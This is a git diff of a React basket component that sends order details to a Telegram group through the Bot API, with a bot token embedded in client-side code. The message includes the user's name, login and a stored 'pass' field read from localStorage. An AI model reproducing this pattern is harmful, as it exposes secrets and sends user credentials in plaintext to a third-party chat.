@@ -13,16 +13,18 @@ const Korzinka = () => {
   const postTest = () => {
     const userCheck = JSON.parse(localStorage.getItem("auth"));
     if (userCheck) {
+      window.location.replace("/");
       axios.post(
         `https://api.telegram.org/bot6141243013:AAHy79TpnOikV3MixBG_L8cfFMvZODHtF9g/sendMessage?chat_id=-906037030&text=${encodeURIComponent(
           `<b>Ma'lumotlar:</b>
       
           <b>  Zakaz Tushti</b> 
           <b>Marhamat zakaz haqida malumotlarni ko'rishiz mumkun</b> 
-          <b> Nomer: +998 93 6677559 </b> 
+        
             <b> Name: ${userCheck.name} </b>
            <b> User: ${userCheck.login} </b>
            <b> Nomer : ${userCheck.pass} </b>
+         
           ${items
         
             .map((item) => {
@@ -32,8 +34,9 @@ const Korzinka = () => {
             
             <b>Total:</b> ${total} som`
         )}&parse_mode=html`
+        
       );
-     
+  
     } else {
       window.location.replace("/sign-up");
     }
